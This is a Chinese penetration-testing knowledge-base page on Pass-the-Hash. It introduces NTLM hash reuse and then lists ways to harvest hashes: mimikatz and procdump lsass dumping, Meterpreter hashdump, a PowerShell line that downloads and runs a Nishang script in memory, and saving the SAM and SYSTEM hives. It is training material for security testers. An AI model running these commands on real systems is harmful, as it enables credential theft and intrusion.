<!doctype html>
<html lang="zh-Hans" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-渗透测试/内网渗透/横向移动/Hash传递" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.8.1">
<title data-rh="true">Hash传递 | d4m1ts 知识库</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://blog.gm7.org/img/docusaurus-social-card.jpg"><meta data-rh="true" name="twitter:image" content="https://blog.gm7.org/img/docusaurus-social-card.jpg"><meta data-rh="true" property="og:url" content="https://blog.gm7.org/docs/渗透测试/内网渗透/横向移动/Hash传递"><meta data-rh="true" property="og:locale" content="zh_Hans"><meta data-rh="true" name="docusaurus_locale" content="zh-Hans"><meta data-rh="true" name="docsearch:language" content="zh-Hans"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="Hash传递 | d4m1ts 知识库"><meta data-rh="true" name="description" content="简介"><meta data-rh="true" property="og:description" content="简介"><link data-rh="true" rel="icon" href="/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://blog.gm7.org/docs/渗透测试/内网渗透/横向移动/Hash传递"><link data-rh="true" rel="alternate" href="https://blog.gm7.org/docs/渗透测试/内网渗透/横向移动/Hash传递" hreflang="zh-Hans"><link data-rh="true" rel="alternate" href="https://blog.gm7.org/docs/渗透测试/内网渗透/横向移动/Hash传递" hreflang="x-default"><link data-rh="true" rel="preconnect" href="https://0LMFVYF6KV-dsn.algolia.net" crossorigin="anonymous"><script data-rh="true" type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"渗透测试","item":"https://blog.gm7.org/docs/渗透测试/"},{"@type":"ListItem","position":2,"name":"横向移动","item":"https://blog.gm7.org/docs/category/横向移动"},{"@type":"ListItem","position":3,"name":"Hash传递","item":"https://blog.gm7.org/docs/渗透测试/内网渗透/横向移动/Hash传递"}]}</script><link rel="alternate" type="application/rss+xml" href="/blog/rss.xml" title="d4m1ts 知识库 RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/blog/atom.xml" title="d4m1ts 知识库 Atom Feed">




<link rel="search" type="application/opensearchdescription+xml" title="d4m1ts 知识库" href="/opensearch.xml"><link rel="stylesheet" href="/assets/css/styles.933499b4.css">
<script src="/assets/js/runtime~main.188591bd.js" defer="defer"></script>
<script src="/assets/js/main.f3e1b88f.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<svg xmlns="http://www.w3.org/2000/svg" style="display: none;"><defs>
<symbol id="theme-svg-external-link" viewBox="0 0 24 24"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"/></symbol>
</defs></svg>
<script>!function(){var t="light";var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();document.documentElement.setAttribute("data-theme",e||t),document.documentElement.setAttribute("data-theme-choice",e||t)}(),function(){try{const c=new URLSearchParams(window.location.search).entries();for(var[t,e]of c)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><link rel="preload" as="image" href="/img/logo.svg"><div role="region" aria-label="跳到主要内容"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">跳到主要内容</a></div><nav aria-label="主导航" class="theme-layout-navbar navbar navbar--fixed-top"><div class="navbar__inner"><div class="theme-layout-navbar-left navbar__items"><button aria-label="切换导航栏" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/"><div class="navbar__logo"><img src="/img/logo.svg" alt="logo" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/img/logo.svg" alt="logo" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div><b class="navbar__title text--truncate"></b></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/docs/intro">知识库</a></div><div class="theme-layout-navbar-right navbar__items navbar__items--right"><a href="https://github.com/damit5/damit5.github.io" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="system mode" aria-label="切换浅色/暗黑模式（当前为system mode）"><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP systemToggleIcon_QzmC"><path fill="currentColor" d="m12 21c4.971 0 9-4.029 9-9s-4.029-9-9-9-9 4.029-9 9 4.029 9 9 9zm4.95-13.95c1.313 1.313 2.05 3.093 2.05 4.95s-0.738 3.637-2.05 4.95c-1.313 1.313-3.093 2.05-4.95 2.05v-14c1.857 0 3.637 0.737 4.95 2.05z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"><button type="button" class="DocSearch DocSearch-Button" aria-label="搜索 (Command+K)"><span class="DocSearch-Button-Container"><svg width="20" height="20" class="DocSearch-Search-Icon" viewBox="0 0 20 20" aria-hidden="true"><path d="M14.386 14.386l4.0877 4.0877-4.0877-4.0877c-2.9418 2.9419-7.7115 2.9419-10.6533 0-2.9419-2.9418-2.9419-7.7115 0-10.6533 2.9418-2.9419 7.7115-2.9419 10.6533 0 2.9419 2.9418 2.9419 7.7115 0 10.6533z" stroke="currentColor" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"></path></svg><span class="DocSearch-Button-Placeholder">搜索</span></span><span class="DocSearch-Button-Keys"></span></button></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="theme-layout-main main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="回到顶部" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd"><nav aria-label="文档侧边栏" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/intro">Introduction</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" href="/docs/渗透测试/">渗透测试</a><button aria-label="折叠侧边栏分类 &#x27;渗透测试&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/docs/渗透测试/信息收集/资产收集/主域名收集/">信息收集</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/渗透测试/WEB漏洞/">WEB漏洞</a><button aria-label="展开侧边栏分类 &#x27;WEB漏洞&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/思路技巧">思路技巧</a><button aria-label="展开侧边栏分类 &#x27;思路技巧&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/渗透测试/权限维持/">权限维持</a><button aria-label="展开侧边栏分类 &#x27;权限维持&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/小程序测试">小程序测试</a><button aria-label="展开侧边栏分类 &#x27;小程序测试&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/保护自己">保护自己</a><button aria-label="展开侧边栏分类 &#x27;保护自己&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/waf绕过">WAF绕过</a><button aria-label="展开侧边栏分类 &#x27;WAF绕过&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/渗透测试/攻防演练/">攻防演练</a><button aria-label="展开侧边栏分类 &#x27;攻防演练&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/渗透测试/社工钓鱼/">社工钓鱼</a><button aria-label="展开侧边栏分类 &#x27;社工钓鱼&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/docs/category/cs">C2</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/docs/category/powershell">免杀</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" role="button" aria-expanded="true" tabindex="0" href="/docs/category/内网基础知识">内网渗透</a></div><ul class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/内网基础知识">内网基础知识</a><button aria-label="展开侧边栏分类 &#x27;内网基础知识&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/信息收集">信息收集</a><button aria-label="展开侧边栏分类 &#x27;信息收集&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/内网穿透">内网穿透</a><button aria-label="展开侧边栏分类 &#x27;内网穿透&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" tabindex="0" href="/docs/category/横向移动">横向移动</a><button aria-label="折叠侧边栏分类 &#x27;横向移动&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/内网渗透/横向移动/横向移动">横向移动</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/docs/渗透测试/内网渗透/横向移动/Hash传递">Hash传递</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/内网渗透/横向移动/NTLM_Relay">NTLM_Relay</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/内网渗透/横向移动/域控相关漏洞">域控相关漏洞</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/内网渗透/横向移动/exchange相关漏洞">exchange相关漏洞</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/内网渗透/横向移动/已知账号密码横向">已知账号密码横向</a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/权限维持">权限维持</a><button aria-label="展开侧边栏分类 &#x27;权限维持&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/日志清理">日志清理</a><button aria-label="展开侧边栏分类 &#x27;日志清理&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/工具小结">工具小结</a><button aria-label="展开侧边栏分类 &#x27;工具小结&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/渗透技巧">渗透技巧</a><button aria-label="展开侧边栏分类 &#x27;渗透技巧&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/基础知识扫盲">基础知识扫盲</a><button aria-label="展开侧边栏分类 &#x27;基础知识扫盲&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/docs/代码审计/">代码审计</a><button aria-label="展开侧边栏分类 &#x27;代码审计&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/编程开发/GO/GO基础/">编程开发</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/category/前置基础知识">移动安全</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/应急响应/简介/">应急响应</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/category/日常使用">AI</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/暂未分类/自建网盘/h5ai/">暂未分类</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/致谢">致谢</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/更新日志">更新日志</a></li></ul></nav></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_z5aJ"><div class="docItemContainer_c0TR"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="页面路径"><ul class="breadcrumbs"><li class="breadcrumbs__item"><a aria-label="主页面" class="breadcrumbs__link" href="/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li class="breadcrumbs__item"><a class="breadcrumbs__link" href="/docs/渗透测试/"><span>渗透测试</span></a></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">内网渗透</span></li><li class="breadcrumbs__item"><a class="breadcrumbs__link" href="/docs/category/横向移动"><span>横向移动</span></a></li><li class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link">Hash传递</span></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_bxCs"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">本页总览</button></div><div class="theme-doc-markdown markdown"><header><h1>Hash传递</h1></header><h2 class="anchor anchorWithStickyNavbar_LWe7" id="简介">简介<a href="#简介" class="hash-link" aria-label="简介的直接链接" title="简介的直接链接">​</a></h2>
<p>Hash传递攻击，也称为Pass the Hash (PTH)，内网横向最常用的手段之一。</p>
<p>攻击者获取目标系统用户的密码哈希值（通常是NTLM Hash），然后直接使用该哈希值进行身份验证，绕过了明文密码的需求。</p>
<p><strong>原理：</strong> 由于整个NTLM认证的过程中都是用的NTLM Hash去加密，所以我们拿到了Hash，其实也相当于变相拿到了密码，只不过不是明文的而已。</p>
<p><strong>利用场景：</strong></p>
<ul>
<li>目标机&gt;=win server 2012时，lsass.exe进程中是抓不到明文密码，只能拿到Hash</li>
<li>随着信息安全意识的提高，弱口令情况逐渐降低，我们经常会遇到拿到Hash却解不开的情况，只能去传递Hash</li>
</ul>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="如何拿到hash">如何拿到Hash<a href="#如何拿到hash" class="hash-link" aria-label="如何拿到Hash的直接链接" title="如何拿到Hash的直接链接">​</a></h2>
<ol>
<li>
<p>运行中的系统，需要抓取 <code>lsass.exe</code> 的内存，进程里边存放的是活动用户（当前登录的用户）的Hash；在域中，只要域管理员通过RDP登录过，就会将hash保存到lsass中。</p>
</li>
<li>
<p>普通域用户或普通工作组：SAM文件（加密后的用户密码）和 SYSTEM文件（秘钥）组合后可以提取出用户的用户名和Hash</p>
</li>
<li>
<p>域控：<code>ntds.dit</code> 存放了所有域用户的账号/密码（Hash）</p>
</li>
</ol>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="普通pc">普通PC<a href="#普通pc" class="hash-link" aria-label="普通PC的直接链接" title="普通PC的直接链接">​</a></h3>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="mimikatz">mimikatz<a href="#mimikatz" class="hash-link" aria-label="mimikatz的直接链接" title="mimikatz的直接链接">​</a></h4>
<p>直接上</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">mimikatz.exe </span><span class="token string" style="color:#e3116c">&quot;privilege::debug&quot;</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;sekurlsa::logonpasswords&quot;</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;exit&quot;</span><br></span></code></pre></div></div>
<p>但大多数情况下都会被杀软干掉，所以需要先把 <code>lsass.exe</code> 的内存dump下来，然后再在本地用 <a href="https://github.com/gentilkiwi/mimikatz" target="_blank" rel="noopener noreferrer">mimikatz</a> 解析。</p>
<p>最多的就是用微软提供的 <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procdump" target="_blank" rel="noopener noreferrer"><code>procdump</code></a> 去dump lsass的内存</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">procdump64.exe </span><span class="token parameter variable" style="color:#36acaa">-accepteula</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-ma</span><span class="token plain"> lsass.exe lsass.dmp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mimikatz.exe </span><span class="token string" style="color:#e3116c">&quot;sekurlsa::minidump lsass.dmp&quot;</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;sekurlsa::logonPasswords full&quot;</span><span class="token plain"> </span><span class="token builtin class-name">exit</span><br></span></code></pre></div></div>
<p>但目前 procdump 基本也被干掉了，可以去GitHub上找找<a href="https://github.com/search?q=dump%20lsass&amp;type=repositories" target="_blank" rel="noopener noreferrer">最新发布</a>的一些可用的，不行的话就再魔改。</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="msf">MSF<a href="#msf" class="hash-link" aria-label="MSF的直接链接" title="MSF的直接链接">​</a></h4>
<p>有meterpreter后</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">hashdump</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">run hashdump</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">run post/windows/gather/smart_hashdump</span><br></span></code></pre></div></div>
<p>也可以再上面的基础上，加载其他的插件</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">load kivi </span><span class="token comment" style="color:#999988;font-style:italic"># 加载</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msv</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">tspkg</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">wdigest</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">kerberos</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ssp</span><br></span></code></pre></div></div>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="nishang">Nishang<a href="#nishang" class="hash-link" aria-label="Nishang的直接链接" title="Nishang的直接链接">​</a></h4>
<p>基于powershell的，可以下载到本地也可以无文件落地导出。</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">powershell iex </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">New-Object Net.WebClient</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">.DownloadString</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain">Get-PassHashes</span><br></span></code></pre></div></div>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="手动从sam获取">手动从SAM获取<a href="#手动从sam获取" class="hash-link" aria-label="手动从SAM获取的直接链接" title="手动从SAM获取的直接链接">​</a></h4>
<p>导出SAM数据</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">reg save HKLM\SYSTEM SYSTEM</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">reg save HKLM\SAM SAM</span><br></span></code></pre></div></div>
<p>使用mimikatz提取hash：</p>
